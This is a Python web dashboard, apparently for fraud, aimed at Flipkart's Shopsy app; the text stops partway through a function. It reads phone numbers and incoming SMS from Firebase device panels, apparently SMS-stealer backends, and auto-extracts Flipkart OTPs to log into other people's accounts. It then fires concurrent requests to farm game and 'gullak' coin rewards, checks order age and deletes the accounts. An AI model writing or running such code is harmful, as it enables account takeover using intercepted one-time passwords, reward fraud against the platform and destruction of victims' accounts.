#!/usr/bin/env python3
"""
Flipkart Panel Automation – Web Dashboard (aiohttp + websockets)
- Auto‑fetch OTP from panel (no manual input needed)
- Raw Firebase URLs supported
- Fetch devices from panel
- Full Flipkart automation
"""

import os, sys, json, time, uuid, asyncio, aiohttp, aiohttp.web, requests, re, base64, urllib.parse
from pathlib import Path
from typing import Optional, Dict, List, Any, Tuple
from dataclasses import dataclass, field
from datetime import datetime, timedelta

# ------------------- CONFIG -------------------
DATA_DIR = Path("sessions")
DATA_DIR.mkdir(parents=True, exist_ok=True)

DEFAULT_PINCODE = "226001"
FIXED_CONCURRENCY = 10
GAMES = [
    {"id": "runner-3d", "name": "Super Runner", "play_time": 94, "gems": 200},
    {"id": "city-builder", "name": "City Builder", "play_time": 47, "gems": 100},
    {"id": "match-3", "name": "Fruit Crush", "play_time": 35, "gems": 100},
    {"id": "goods-triple", "name": "Grocery Match", "play_time": 40, "gems": 100},
    {"id": "ludo", "name": "Ludo", "play_time": 50, "gems": 100},
    {"id": "nazaria", "name": "Nazar Pop", "play_time": 45, "gems": 100},
]
FAST_PLAY_SEC = 18
ELIGIBILITY_DAYS = 30
OTP_TIMEOUT = 90
MAX_CONCURRENT = 5

# ------------------- LOGGING -------------------
class Logger:
    def __init__(self, debug=False): self.debug = debug
    def info(self, msg): print(f"[+] {msg}", flush=True)
    def ok(self, msg): print(f"[✓] {msg}", flush=True)
    def warn(self, msg): print(f"[!] {msg}", flush=True)
    def error(self, msg): print(f"[-] {msg}", flush=True)

log = Logger()

# ------------------- SHOPSY CLIENT -------------------
ROME_TEMPLATE = "https://{dc}.rome.api.flipkart.net"
APP_VERSION = "2291175"
DEVICE_MODEL = "Pixel 9a"
DEVICE_BRAND = "Google"

@dataclass
class ShopsySession:
    device_id: str = field(default_factory=lambda: uuid.uuid4().hex)
    visit_id: str = field(default_factory=lambda: f"{uuid.uuid4().hex}-{int(time.time() * 1000)}")
    dc_id: str = "1"
    at: str = ""
    sn: str = ""
    vid: str = ""
    secure_token: str = ""
    secure_cookie: str = ""
    account_id: str = ""
    user_name: str = ""
    is_logged_in: bool = False
    phone: str = ""
    email: str = ""

class AsyncShopsyClient:
    def __init__(self, log: Logger = None, fast: bool = True):
        self.log = log or Logger()
        self.fast = fast
        self.ctx = ShopsySession()
        self._session: Optional[aiohttp.ClientSession] = None
        self._user_cache = None
        self.base_url = ROME_TEMPLATE.format(dc=self.ctx.dc_id)
        self.emit_callback = None

    def set_emit_callback(self, cb):
        self.emit_callback = cb

    async def emit(self, status: str, data: dict = None):
        if self.emit_callback:
            await self.emit_callback({"status": status, "data": data})

    async def __aenter__(self):
        connector = aiohttp.TCPConnector(limit=0, limit_per_host=0, ttl_dns_cache=300, enable_cleanup_closed=True)
        self._session = aiohttp.ClientSession(connector=connector, timeout=aiohttp.ClientTimeout(total=30))
        return self

    async def __aexit__(self, exc_type, exc_val, exc_tb):
        if self._session:
            await self._session.close()

    def _sync_urls(self):
        self.base_url = ROME_TEMPLATE.format(dc=self.ctx.dc_id)

    def _url(self, path: str) -> str:
        return f"{self.base_url}{path}"

    @property
    def x_user_agent(self) -> str:
        return f"Mozilla/5.0 (Linux; Android 15; {DEVICE_MODEL} Build/BD4A.250505.003) FKUA/Retail/{APP_VERSION}/Android/Mobile ({DEVICE_BRAND}/{DEVICE_MODEL}/{self.ctx.device_id})"

    def _partner_headers(self, layout: bool = False) -> dict:
        headers = {
            "User-Agent": "okhttp/4.9.2",
            "Content-Type": "application/json; charset=UTF-8",
            "Accept-Encoding": "gzip",
            "X-PARTNER-CONTEXT": '{"source":"reseller"}',
            "FK-TENANT-ID": "SHOPSY",
            "business": "reseller",
            "X-User-Agent": self.x_user_agent,
            "X-Visit-Id": self.ctx.visit_id,
            "X-NewRelic-ID": "VwEHU1dSCxABUVlaAAQHU1UA",
        }
        if layout:
            headers["X-Layout-Version"] = '{"appVersion":"910000","frameworkVersion":"1.0"}'
        if self.ctx.at: headers["at"] = self.ctx.at
        if self.ctx.sn: headers["sn"] = self.ctx.sn
        if self.ctx.secure_token: headers["secureToken"] = self.ctx.secure_token
        if self.ctx.secure_cookie: headers["secureCookie"] = self.ctx.secure_cookie
        return headers

    def _game_headers(self) -> dict:
        return {
            "User-Agent": "okhttp/4.9.2",
            "Content-Type": "application/json; charset=UTF-8",
            "Accept-Encoding": "gzip",
            "x-user-agent": self.x_user_agent,
            "sessionid": "session_id",
            "X-NewRelic-ID": "VwEHU1dSCxABUVlaAAQHU1UA",
        }

    def _extract_dc_id(self, data: dict, http_status: int) -> Optional[str]:
        is_dc = http_status == 406 or data.get("STATUS_CODE") == 406
        if not is_dc: return None
        if data.get("ERROR_MESSAGE") != "DC Change" and data.get("ERROR_CODE") != 2000: return None
        dc_info = (data.get("META_INFO") or {}).get("dcInfo") or data.get("RESPONSE") or {}
        return str(dc_info.get("id")) if dc_info.get("id") else None

    def _capture_secure_cookie(self, response: aiohttp.ClientResponse) -> None:
        secure_cookie = response.headers.get("securecookie") or response.headers.get("secureCookie")
        if secure_cookie: self.ctx.secure_cookie = secure_cookie

    def _apply_session(self, data):
        session = data.get("SESSION") or {}
        if not session: return
        self.ctx.at = session.get("at") or self.ctx.at
        self.ctx.sn = session.get("sn") or self.ctx.sn
        self.ctx.vid = session.get("vid") or self.ctx.vid
        self.ctx.secure_token = session.get("secureToken") or self.ctx.secure_token
        self.ctx.account_id = session.get("accountId") or self.ctx.account_id
        self.ctx.is_logged_in = bool(session.get("isLoggedIn"))
        if session.get("firstName"):
            last = session.get("lastName") or ""
            self.ctx.user_name = f"{session['firstName']} {last}".strip()

    async def _post_json(self, url: str, payload: dict, *, game: bool = False, layout: bool = False) -> dict:
        path = self._url(url) if url.startswith("/") else self._url("/" + url.lstrip("/"))
        for attempt in range(10):
            headers = self._game_headers() if game else self._partner_headers(layout=layout)
            try:
                async with self._session.post(path, json=payload, headers=headers) as response:
                    self._capture_secure_cookie(response)
                    data = await response.json()
                    dc_id = self._extract_dc_id(data, response.status)
                    if dc_id:
                        self.ctx.dc_id = dc_id
                        self._sync_urls()
                        log.warn(f"DC Change: switching to DC {dc_id}")
                        await asyncio.sleep(1.5)
                        path = self._url(url) if url.startswith("/") else self._url("/" + url.lstrip("/"))
                        continue
                    if not game: self._apply_session(data)
                    if response.status >= 400 or (data.get("STATUS_CODE") or 200) >= 400:
                        raise RuntimeError(f"HTTP {response.status}: {data.get('ERROR_MESSAGE') or data}")
                    return data
            except aiohttp.ClientError as e:
                if attempt == 9: raise RuntimeError(f"Request failed after 10 attempts: {e}")
                await asyncio.sleep(1 * (attempt + 1))
        raise RuntimeError("Max retry attempts exceeded")

    # ---------- LOGIN ----------
    async def bootstrap(self) -> None:
        await self.emit("bootstrap_start")
        log.info(f"Bootstrap (DC {self.ctx.dc_id})...")
        payload = {
            "pageUri": "/shopsy2-login-page-store",
            "pageContext": {
                "pageHashKey": None,
                "slotContextMap": None,
                "paginationContextMap": None,
                "stateInfoMap": None,
                "slotIdInfoMap": None,
                "paginatedFetch": False,
                "pageNumber": 1,
                "fetchAllPages": False,
                "networkSpeed": 3000,
                "trackingContext": None,
                "fetchSeoData": False,
            },
            "partnerContext": None,
            "locationContext": {"pincode": DEFAULT_PINCODE},
            "requestContext": None,
        }
        await self._post_json("/4/page/fetch", payload, layout=True)
        await self.emit("bootstrap_done", {"dc": self.ctx.dc_id})
        log.ok(f"Bootstrap OK | dc={self.ctx.dc_id}")

    async def send_otp(self, phone: str) -> str:
        phone = phone.strip().replace("+91", "").replace(" ", "")
        await self.emit("otp_sending", {"phone": phone})
        log.info(f"Sending OTP to +91{phone}")
        payload = {
            "actionRequestContext": {
                "type": "LOGIN_IDENTITY_VERIFY_SHOPSY2",
                "loginId": phone,
                "loginIdPrefix": "+91",
                "phoneNumberFormat": "E164",
                "addAppHash": True,
                "loginType": "MOBILE",
                "verificationType": "OTP",
                "sourceContext": "DEFAULT",
                "clientQueryParamMap": None,
            }
        }
        data = await self._post_json("/1/action/view", payload)
        response_ctx = data.get("RESPONSE", {}).get("actionResponseContext", {})
        if not data.get("RESPONSE", {}).get("actionSuccess"):
            raise RuntimeError(f"OTP send failed: {data}")
        request_id = response_ctx.get("requestId")
        if not request_id:
            remaining = response_ctx.get("remainingAttempts")
            if remaining == 0:
                raise RuntimeError("OTP limit reached (remainingAttempts=0)")
            raise RuntimeError(f"OTP requestId not found: {response_ctx}")
        self.ctx.phone = phone
        await self.emit("otp_sent", {"request_id": request_id[:12]})
        log.ok(f"OTP sent | requestId={request_id[:12]}...")
        return request_id

    async def verify_otp(self, phone: str, otp: str, otp_request_id: str) -> None:
        phone = phone.strip().replace("+91", "").replace(" ", "")
        await self.emit("otp_verifying")
        log.info("Verifying OTP...")
        payload = {
            "actionRequestContext": {
                "type": "LOGIN_SHOPSY2",
                "loginId": phone,
                "loginIdPrefix": "+91",
                "password": None,
                "otp": otp.strip(),
                "otpRequestId": otp_request_id,
                "remainingAttempts": 5,
                "phoneNumberFormat": "E164",
                "loginType": "MOBILE",
                "verificationType": "OTP",
                "sourceContext": "DEFAULT",
                "churned": False,
                "otpRegex": None,
                "data": None,
                "clientQueryParamMap": None,
            }
        }
        data = await self._post_json("/1/action/view", payload)
        response_ctx = data.get("RESPONSE", {}).get("actionResponseContext", {})
        if not response_ctx.get("authenticationSuccess"):
            error_msg = response_ctx.get("errorMessage", {}).get("message", {}).get("text", "")
            if "Incorrect OTP" in error_msg:
                raise RuntimeError(f"Wrong OTP: {error_msg}")
            raise RuntimeError(f"Login failed: {data}")
        await self.emit("otp_verified", {"account_id": self.ctx.account_id})
        log.ok(f"Login successful | account={self.ctx.account_id}")

    async def poll_otp_from_panel(self, firebase_url: str, device_id: str, sender_keyword: str, timeout: int = OTP_TIMEOUT) -> Optional[str]:
        """Poll Firebase panel for OTP message for given device."""
        start = time.time()
        trigger_time = int(time.time() * 1000)
        async with aiohttp.ClientSession() as session:
            while time.time() - start < timeout:
                try:
                    async with session.get(f"{firebase_url}messages/{device_id}.json") as resp:
                        if resp.status != 200:
                            await asyncio.sleep(3)
                            continue
                        msgs = await resp.json()
                        if not msgs:
                            await asyncio.sleep(3)
                            continue
                        # Iterate messages from newest to oldest
                        for msg_id in sorted(msgs.keys(), reverse=True):
                            msg_data = msgs[msg_id]
                            if not isinstance(msg_data, dict):
                                continue
                            try:
                                msg_ts = int(msg_id)
                                if msg_ts < trigger_time - 30000:  # only messages after OTP trigger
                                    continue
                            except:
                                pass
                            sender = msg_data.get("sender", "")
                            if sender_keyword.lower() in sender.lower():
                                body = msg_data.get("body") or msg_data.get("message") or ""
                                match = re.search(r'(?<!\d)(\d{4}|\d{6})(?!\d)', body)
                                if match:
                                    return match.group(0)
                        await asyncio.sleep(3)
                except Exception as e:
                    log.warn(f"Error polling OTP: {e}")
                    await asyncio.sleep(3)
        return None

    # ---------- ORDER HISTORY ----------
    async def fetch_order_history(self, page: int = 1) -> dict:
        await self.emit("order_fetching")
        log.info(f"Fetching order history - Page {page}...")
        payload = {
            "requestContext": {
                "type": "MY_ORDER_PAGE",
                "pageView": "",
                "queryTime": "",
                "cxTenant": "cs",
                "pageName": "",
                "pageNumber": page,
                "salesAppFilter": "FLIPKART,SLAP"
            },
            "pageType": "MY_ORDER_PAGE",
            "pageUri": "/cx/my_orders",
            "pageContext": {
                "pageHashKey": None,
                "slotContextMap": None,
                "paginationContextMap": None,
                "paginatedFetch": False,
                "pageNumber": page,
                "fetchAllPages": False,
                "networkSpeed": 0,
                "trackingContext": None,
                "fetchSeoData": False
            },
            "locationContext": {"pincode": ""}
        }
        data = await self._post_json("/api/4/page/fetch", payload)
        await self.emit("order_fetched")
        return data

    def extract_orders_from_response(self, data: dict) -> List[dict]:
        orders = []
        try:
            response_data = data.get("RESPONSE", data)
            params = response_data.get("params", {})
            xtrasaver = params.get("xtrasaverSalesExp", {})
            order_ids = set()
            for key in xtrasaver.keys():
                if key.startswith("OD"):
                    order_ids.add(key)
            response_str = json.dumps(response_data)
            od_matches = re.findall(r'"OD\d+"', response_str)
            for match in od_matches:
                order_ids.add(match.strip('"'))
            for order_id in order_ids:
                order_info = self._extract_order_from_response(response_data, order_id)
                if order_info:
                    orders.append(order_info)
            if not orders:
                orders = self._extract_orders_from_raw(response_data)
            log.info(f"Extracted {len(orders)} orders")
        except Exception as e:
            log.error(f"Error extracting orders: {e}")
        return orders

    def _extract_order_from_response(self, response_data: dict, order_id: str) -> Optional[dict]:
        try:
            response_str = json.dumps(response_data)
            order_date = None
            for pattern in [
                r'"orderDate":\s*(\d+)',
                r'"placedDate":\s*(\d+)',
                r'"createdAt":\s*(\d+)',
                r'"eventDate":\s*(\d+)',
                r'"actualDeliveredDate":\s*(\d+)',
            ]:
                matches = re.findall(pattern, response_str)
                for match in matches:
                    try:
                        ts = int(match)
                        if ts > 100000000000:
                            ts = ts / 1000
                        dt = datetime.fromtimestamp(ts)
                        if 2023 <= dt.year <= 2027:
                            order_date = ts
                            break
                    except:
                        continue
                if order_date:
                    break
            order_status = "Unknown"
            for pattern in [
                r'"status":\s*{[^}]*"text":\s*"([^"]+)"',
                r'"orderStatus":\s*"([^"]+)"',
                r'"status":\s*{[^}]*"vernacularKey":\s*"([^"]+)"',
            ]:
                matches = re.findall(pattern, response_str)
                if matches:
                    order_status = matches[0]
                    break
            products = []
            for pattern in [r'"title":\s*"([^"]+)"[^}]*"brand":\s*"([^"]+)"',
                            r'"title":\s*"([^"]+)"[^}]*"brandName":\s*"([^"]+)"']:
                matches = re.findall(pattern, response_str)
                for title, brand in matches[:5]:
                    if title and len(title) > 3:
                        products.append({"product_name": title, "brand": brand or "Unknown", "quantity": 1})
                if products:
                    break
            total_amount = 0
            for pattern in [r'"totalAmount":\s*([\d.]+)', r'"amount":\s*([\d.]+)', r'"totalPrice":\s*([\d.]+)']:
                matches = re.findall(pattern, response_str)
                if matches:
                    try:
                        total_amount = float(matches[0])
                        break
                    except:
                        continue
            if order_date:
                return {
                    "order_id": order_id,
                    "order_status": order_status,
                    "order_date": order_date,
                    "items": products,
                    "total_amount": total_amount
                }
            return None
        except Exception:
            return None

    def _extract_orders_from_raw(self, data: Any) -> List[dict]:
        orders = []
        if isinstance(data, dict):
            for key, value in data.items():
                if isinstance(value, str) and value.startswith("OD") and len(value) >= 20:
                    info = self._extract_order_from_response(data, value)
                    if info:
                        orders.append(info)
                elif isinstance(value, (dict, list)):
                    orders.extend(self._extract_orders_from_raw(value))
        elif isinstance(data, list):
            for item in data:
                orders.extend(self._extract_orders_from_raw(item))
        return orders

    async def get_latest_order(self) -> Optional[dict]:
        try:
            data = await self.fetch_order_history(1)
        except Exception as e:
            log.warn(f"Could not fetch order history: {e}. Treating as no orders (eligible).")
            return None
        orders = self.extract_orders_from_response(data)
        if not orders:
            return None
        def get_date(order):
            d = order.get("order_date")
            if d:
                if isinstance(d, (int, float)):
                    if d > 100000000000:
                        d = d / 1000
                    return datetime.fromtimestamp(d)
            return datetime.min
        orders.sort(key=get_date, reverse=True)
        return orders[0]

    def check_deletion_eligibility(self, order_date) -> Tuple[bool, str, Optional[datetime]]:
        if not order_date:
            return True, "ELIGIBLE - No orders found (new account)", None
        try:
            if isinstance(order_date, (int, float)):
                if order_date > 100000000000:
                    order_date = order_date / 1000
                dt = datetime.fromtimestamp(order_date)
            elif isinstance(order_date, str) and order_date.isdigit():
                ts = int(order_date)
                if ts > 100000000000:
                    ts = ts / 1000
                dt = datetime.fromtimestamp(ts)
            else:
                return True, "ELIGIBLE - Could not parse date", None
            threshold = datetime.now() - timedelta(days=ELIGIBILITY_DAYS)
            days_old = (datetime.now() - dt).days
            if dt < threshold:
                return True, f"ELIGIBLE - {days_old} days old (>{ELIGIBILITY_DAYS} days)", dt
            else:
                return False, f"NOT ELIGIBLE - {days_old} days old (<{ELIGIBILITY_DAYS} days)", dt
        except Exception as e:
            return True, f"ELIGIBLE (fallback) - {e}", None

    # ---------- GAME EXPLOIT ----------
    async def games_api(self, route_uri: str, method: str, payload: dict) -> dict:
        body = {"requestMethod": method, "routeUri": route_uri, "payload": payload}
        return await self._post_json("/1/shopsy/games", body, game=True)

    async def get_user(self, refresh: bool = False) -> dict:
        if not self.ctx.account_id:
            raise RuntimeError("Account ID missing")
        if self._user_cache and not refresh:
            return self._user_cache
        data = await self.games_api(
            "user/get-user", "GET",
            {"userId": self.ctx.account_id, "userName": self.ctx.user_name or "User"}
        )
        if not data.get("success"):
            raise RuntimeError(f"get-user failed: {data}")
        self._user_cache = data["data"]
        return self._user_cache

    async def start_game(self, game: dict) -> str:
        start = await self.games_api(
            "game/game-started", "POST",
            {"userId": self.ctx.account_id, "gameId": game["id"]}
        )
        if not start.get("success"):
            raise RuntimeError(f"Game start failed: {start}")
        return start["data"]["sessionId"]

    async def end_game(self, game: dict, session_id: str, play_time: int) -> dict:
        return await self.games_api(
            "game/game-ended", "POST",
            {
                "userId": self.ctx.account_id,
                "gameId": game["id"],
                "sessionId": session_id,
                "gemsEarned": game["gems"],
                "playTimeInSec": play_time,
            }
        )

    async def _play_seconds(self, game: dict) -> int:
        if not self.fast:
            return game["play_time"]
        if game["play_time"] >= 60:
            return game["play_time"]
        return min(game["play_time"], FAST_PLAY_SEC)

    async def claim_gullak(self, label: str = "Gullak") -> Optional[dict]:
        await self.emit("gullak_claiming", {"label": label})
        log.info(f"{label} claim...")
        data = await self.games_api(
            "gullak/claim-gullak", "POST",
            {"userId": self.ctx.account_id}
        )
        if not data.get("success"):
            log.warn(f"{label} skip/fail: {data}")
            return None
        self._user_cache = None
        return data["data"]

    async def parallel_game_exploit(self, game: dict, parallel_count: int) -> Tuple[int, List[str]]:
        logs = []
        game_id = game["id"]
        name = game["name"]
        logs.append(f"Starting {name} × {parallel_count} parallel")
        await self.emit("game_start", {"game": name, "parallel": parallel_count})
        try:
            user = await self.get_user(refresh=True)
            for g in user.get("gameStats", {}).get("games", []):
                if g.get("gameId") == game_id and g.get("rewards", {}).get("isMaxGameBonusEarned"):
                    logs.append(f"{name} already done today. Skipping.")
                    await self.emit("game_skip", {"game": name})
                    return 0, logs
        except Exception as e:
            logs.append(f"Could not check game status: {e}")
        play_time = await self._play_seconds(game)
        start_tasks = [self.start_game(game) for _ in range(parallel_count)]
        sessions = []
        for result in await asyncio.gather(*start_tasks, return_exceptions=True):
            if isinstance(result, Exception):
                logs.append(f"Session start failed: {result}")
            else:
                sessions.append(result)
        if not sessions:
            logs.append("No sessions started")
            return 0, logs
        logs.append(f"Started {len(sessions)} sessions")
        end_tasks = [self.end_game(game, s, play_time) for s in sessions]
        total = 0
        success = 0
        for future in asyncio.as_completed(end_tasks):
            try:
                result = await future
                if result.get("success"):
                    coins = result["data"].get("coinsEarnedForGame", 0)
                    total += coins
                    success += 1
                    logs.append(f"Session +{coins} coins")
                else:
                    logs.append(f"Session failed: {result}")
            except Exception as e:
                logs.append(f"Session error: {e}")
        self._user_cache = None
        logs.append(f"{name}: {success}/{len(sessions)} successful, total {total} coins")
        await self.emit("game_done", {"game": name, "coins": total, "success": success})
        return total, logs

    async def run_all_games(self) -> Tuple[int, List[str]]:
        total = 0
        all_logs = []
        await self.emit("games_starting")
        for game in GAMES:
            coins, logs = await self.parallel_game_exploit(game, FIXED_CONCURRENCY)
            total += coins
            all_logs.extend(logs)
            await asyncio.sleep(1)
        await self.emit("games_done", {"total_coins": total})
        return total, all_logs

    async def run_gullak_exploit(self) -> Tuple[int, List[str]]:
        logs = []
        await self.emit("gullak_starting")
        tasks = [self.claim_gullak(f"Gullak {i+1}") for i in range(10)]
        total = 0
        for future in asyncio.as_completed(tasks):
            try:
                result = await future
                if result:
                    coins = result.get("loginRewardCoinsClaimed", 0) + result.get("gameRewardCoinsClaimed", 0)
                    total += coins
                    logs.append(f"Gullak +{coins} coins")
            except Exception as e:
                logs.append(f"Gullak error: {e}")
        logs.append(f"Gullak total coins: {total}")
        await self.emit("gullak_done", {"total_coins": total})
        return total, logs

    def import_session(self, tokens: dict) -> bool:
        try:
            for key in ["at", "sn", "secureToken", "secureCookie", "vid", "accountId", "device_id", "visit_id", "dc_id", "userName", "phone", "email"]:
                if key in tokens:
                    setattr(self.ctx, key, tokens[key])
            self._sync_urls()
            self.ctx.is_logged_in = True
            return True
        except Exception:
            return False

    def export_session(self) -> dict:
        return {
            'at': self.ctx.at,
            'sn': self.ctx.sn,
            'secureToken': self.ctx.secure_token,
            'secureCookie': self.ctx.secure_cookie,
            'vid': self.ctx.vid,
            'accountId': self.ctx.account_id,
            'device_id': self.ctx.device_id,
            'visit_id': self.ctx.visit_id,
            'dc_id': self.ctx.dc_id,
            'userName': self.ctx.user_name,
            'phone': self.ctx.phone,
            'email': self.ctx.email,
        }

# ------------------- DELETION CLIENT -------------------
class ShopsyDeleteClient:
    def __init__(self, proxy: Optional[str] = None):
        self.proxy = proxy
        self.session = requests.Session()
        if proxy:
            self.session.proxies = {'http': proxy, 'https': proxy}
        self.device_id = uuid.uuid4().hex
        self.visit_id = f"{uuid.uuid4().hex}-{int(time.time() * 1000)}"
        self.dc_id = "2"
        self.at = self.sn = self.secure_token = self.secure_cookie = self.ud = self.vd = ""
        self.account_id = self.user_name = self.phone = self.email = ""

    def import_session(self, tokens: dict) -> bool:
        try:
            self.at = tokens.get('at', '')
            self.sn = tokens.get('sn', '')
            self.secure_token = tokens.get('secureToken', '')
            self.secure_cookie = tokens.get('secureCookie', '')
            self.ud = tokens.get('ud', '')
            self.vd = tokens.get('vd', '')
            self.account_id = tokens.get('accountId', '')
            self.user_name = tokens.get('userName', 'User')
            self.phone = tokens.get('phone', '')
            self.email = tokens.get('email', '')
            if not self.at or not self.sn:
                return False
            return True
        except Exception:
            return False

    def _build_cookie(self) -> str:
        cookies = []
        if self.ud: cookies.append(f"ud={self.ud}")
        if self.vd: cookies.append(f"vd={self.vd}")
        return "; ".join(cookies)

    def _get_headers(self) -> dict:
        headers = {
            "Content-Type": "application/json",
            "Accept": "*/*",
            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 26_5 like Mac OS X) AppleWebKit/602.4.6 (KHTML, like Gecko) Mobile/14D27; fk_ios_app FKUA/Retail/11.13.1/iOS/Mobile",
            "x-user-agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 26_5 like Mac OS X) AppleWebKit/602.4.6 (KHTML, like Gecko) Mobile/14D27; fk_ios_app FKUA/Retail/11.13.1/iOS/Mobile",
            "flipkart_secure": "true",
        }
        if self.at: headers["at"] = self.at
        if self.sn: headers["sn"] = self.sn
        if self.secure_token: headers["secureToken"] = self.secure_token
        if self.secure_cookie:
            headers["securecookie"] = self.secure_cookie
            headers["sc"] = self.secure_cookie
        cookie = self._build_cookie()
        if cookie: headers["Cookie"] = cookie
        return headers

    def _post(self, url: str, payload: dict, max_retries: int = 5) -> Optional[dict]:
        headers = self._get_headers()
        for attempt in range(max_retries):
            try:
                resp = self.session.post(url, json=payload, headers=headers, timeout=15)
                if resp.status_code == 200:
                    return resp.json()
                if resp.status_code == 406:
                    try:
                        data = resp.json()
                        new_dc = None
                        if "RESPONSE" in data and isinstance(data["RESPONSE"], dict):
                            new_dc = data["RESPONSE"].get("id")
                        if not new_dc and "META_INFO" in data:
                            new_dc = data["META_INFO"].get("dcInfo", {}).get("id")
                        if new_dc and str(new_dc) != self.dc_id:
                            self.dc_id = str(new_dc)
                            url = f"https://{self.dc_id}.rome.api.flipkart.com/1/action/view"
                            continue
                    except:
                        pass
                if resp.status_code == 206:
                    log.error("AT expired. Need re-login.")
                    return None
                if resp.status_code >= 400:
                    log.error(f"Request error {resp.status_code}")
                    return None
            except Exception:
                if attempt == max_retries - 1:
                    return None
                time.sleep(1)
        return None

    def _get_url(self) -> str:
        return f"https://{self.dc_id}.rome.api.flipkart.com/1/action/view"

    def verify_account_delete(self) -> bool:
        data = self._post(self._get_url(), {"actionRequestContext": {"type": "VERIFY_ACCOUNT_DELETE"}})
        return data and data.get("RESPONSE", {}).get("actionSuccess", False)

    def request_delete_otp(self) -> Optional[str]:
        data = self._post(self._get_url(), {"actionRequestContext": {"type": "ACCOUNT_DELETE_GENERATE_OTP"}})
        if data:
            flow = data.get("RESPONSE", {}).get("actionResponseContext", {}).get("flowInstanceId")
            if not flow:
                flow = data.get("actionResponseContext", {}).get("flowInstanceId")
            if flow:
                log.info(f"Delete OTP requested, flow={flow[:20]}...")
                return flow
        return None

    def verify_delete_otp(self, flow_instance_id: str, otp: str) -> bool:
        data = self._post(self._get_url(), {
            "actionRequestContext": {
                "type": "ACCOUNT_DELETE_VERIFY_OTP",
                "flowInstanceId": flow_instance_id,
                "otp": otp,
                "customerGrievance": ""
            }
        })
        if data and data.get("RESPONSE", {}).get("actionSuccess", False):
            log.ok(f"Account {self.account_id} deleted!")
            return True
        return False

# ------------------- PANEL HELPERS -------------------
def parse_panel_link(link: str) -> Optional[Tuple[str, str]]:
    if "?s=" in link:
        parsed = urllib.parse.urlparse(link)
        qs = urllib.parse.parse_qs(parsed.query)
        if 's' in qs:
            s_param = qs['s'][0]
            s_param += "=" * ((4 - len(s_param) % 4) % 4)
            try:
                decoded = base64.b64decode(s_param).decode('utf-8')
                if '|||' in decoded:
                    parts = decoded.split('|||')
                    if len(parts) >= 2:
                        firebase_url = parts[0].strip()
                        api_key = parts[1].strip()
                        if firebase_url and api_key:
                            if not firebase_url.endswith('/'): firebase_url += '/'
                            return firebase_url, api_key
                if '|' in decoded:
                    parts = decoded.split('|')
                    if len(parts) >= 2:
                        firebase_url = parts[0].strip()
                        api_key = parts[1].strip()
                        if firebase_url and api_key:
                            if not firebase_url.endswith('/'): firebase_url += '/'
                            return firebase_url, api_key
            except:
                pass
    if "firebaseio.com" in link or "firebasedatabase.app" in link:
        if not link.endswith('/'): link += '/'
        return link, None
    return None

def fetch_phone_from_device_id(panel: dict, device_id: str) -> Optional[str]:
    url = panel["url"]
    try:
        resp = requests.get(f"{url}clients/{device_id}.json", timeout=10)
        if resp.status_code == 200:
            data = resp.json()
            if data:
                phone = data.get("mobNo") or data.get("phone") or data.get("mobile")
                if phone:
                    phone = re.sub(r'\D', '', phone)
                    if len(phone) == 10 and phone[0] in "6789":
                        return phone
        resp = requests.get(f"{url}messages/{device_id}.json", timeout=10)
        if resp.status_code == 200:
            msgs = resp.json() or {}
            for msg in msgs.values():
                if not isinstance(msg, dict):
                    continue
                text = str(msg.get("body") or msg.get("message") or msg.get("text") or "")
                match = re.search(r'\b([6-9]\d{9})\b', text)
                if match:
                    return match.group(1)
        return None
    except Exception as e:
        log.error(f"Error fetching phone for {device_id}: {e}")
        return None

def fetch_phones_from_panel(panel: dict) -> List[Tuple[str, str]]:
    url = panel["url"]
    try:
        clients_req = requests.get(url + 'clients.json', timeout=30)
        clients = clients_req.json() or {}
        messages_req = requests.get(url + 'messages.json', timeout=30)
        messages = messages_req.json() or {}
    except Exception as e:
        log.error(f"Failed to fetch panel {panel['name']}: {e}")
        return []

    phones = []
    for c_id, c_data in clients.items():
        if not isinstance(c_data, dict):
            continue
        # Check if device is online (status true)
        if not c_data.get("status"):
            continue
        phone = c_data.get("mobNo") or c_data.get("phone") or c_data.get("mobile")
        if not phone:
            device_messages = messages.get(c_id, {})
            phone = fetch_phone_from_device_id(panel, c_id)
        if phone:
            phone = re.sub(r'\D', '', phone)
            if len(phone) == 10 and phone[0] in "6789":
                phones.append((phone, c_id))
    return phones

# ------------------- WEB SERVER -------------------
from aiohttp import web

task_inputs = {}  # only for coin swap confirmation (manual)
websocket_clients = set()

async def emit_to_all(status, data=None):
    message = json.dumps({"status": status, "data": data})
    for ws in list(websocket_clients):
        try:
            await ws.send_str(message)
        except:
            pass

async def ws_handler(request):
    ws = web.WebSocketResponse()
    await ws.prepare(request)
    websocket_clients.add(ws)
    try:
        async for msg in ws:
            if msg.type == aiohttp.WSMsgType.TEXT:
                data = json.loads(msg.data)
                if data.get('type') == 'start':
                    await handle_start(data, ws)
                elif data.get('type') == 'fetch_devices':
                    await handle_fetch_devices(data, ws)
                elif data.get('type') == 'input_response':
                    device_key = data.get('device')
                    value = data.get('value')
                    if device_key in task_inputs and not task_inputs[device_key].done():
                        task_inputs[device_key].set_result(value)
                elif data.get('type') == 'stop':
                    pass
            elif msg.type == aiohttp.WSMsgType.ERROR:
                log.error(f'WebSocket error: {ws.exception()}')
    finally:
        websocket_clients.remove(ws)
    return ws

async def handle_fetch_devices(data, ws):
    panels_data = data.get('panels', [])
    panels = []
    for link in panels_data:
        parsed = parse_panel_link(link)
        if parsed:
            firebase_url, api_key = parsed
            name = firebase_url.replace("https://", "").replace("http://", "").split('.')[0]
            if not name:
                name = f"Panel_{len(panels)+1}"
            panels.append({"name": name, "url": firebase_url, "sender": "FLPKRT"})
        else:
            await emit_to_all('error', {'message': f'Could not parse panel link: {link[:50]}...'})
    if not panels:
        await emit_to_all('error', {'message': 'No valid panels provided.'})
        return
    panel = panels[0]
    devices = fetch_phones_from_panel(panel)
    result = [{"phone": phone, "device": dev} for phone, dev in devices]
    await emit_to_all('devices_fetched', {'devices': result})

async def handle_start(data, ws):
    panels_data = data.get('panels', [])
    phone_input = data.get('phone_input', [])
    mode = data.get('mode', 'check')
    devices_only = data.get('devices_only', False)

    # Parse panels
    panels = []
    for link in panels_data:
        parsed = parse_panel_link(link)
        if parsed:
            firebase_url, api_key = parsed
            name = firebase_url.replace("https://", "").replace("http://", "").split('.')[0]
            if not name:
                name = f"Panel_{len(panels)+1}"
            panels.append({"name": name, "url": firebase_url, "sender": "FLPKRT"})
        else:
            await emit_to_all('error', {'message': f'Could not parse panel link: {link[:50]}...'})

    if not panels:
        await emit_to_all('error', {'message': 'No valid panels provided.'})
        return

    # Build task list
    tasks = []
    for line in phone_input:
        if not line.strip():
